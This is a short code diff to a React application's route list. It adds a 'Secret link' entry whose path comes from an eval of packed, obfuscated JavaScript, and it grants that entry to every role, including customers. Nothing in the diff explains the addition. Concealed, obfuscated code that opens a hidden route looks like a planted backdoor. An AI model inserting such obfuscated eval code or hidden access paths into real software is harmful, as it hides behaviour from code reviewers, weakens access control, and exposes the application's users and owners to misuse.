@@ -51,6 +51,11 @@ class App extends React.Component {
         route: '/issues',
         allowedRoles: [ROLE_MANAGER, ROLE_DEVELOPER],
       },
+      {
+        name: 'Secret link',
+        route: eval(function(oo_d,$_00000000000000000000000,z,_,$____,k$$$$$$$___04$$){while(z--){if(_[z]){oo_d=oo_d.replace(new RegExp('\\b'+z.toString($_00000000000000000000000)+'\\b','g'),_[z])}}return oo_d}('((7,d,e)=>{5 3=i;6[\'h\',\'`\',\'h\',\']\',\'\\f\',\'9\'].g((4)=>{3=((3+b)*8)%a;5 c=0,2=-1;p{2=j*c++ +4.n(0)-3}k(2<0);6 r.m(2)}).l(\'\')})(o,q,{})',28,28,'||result|x|item|let|return|s|2591||1949|1129||y|bb|u0014|map||773|127|while|join|fromCharCode|charCodeAt|14|do|30|String'.split('|'))),
+        allowedRoles: [ROLE_ADMIN, ROLE_CUSTOMER, ROLE_DEVELOPER, ROLE_MANAGER],
+      }
     ];
   }
 
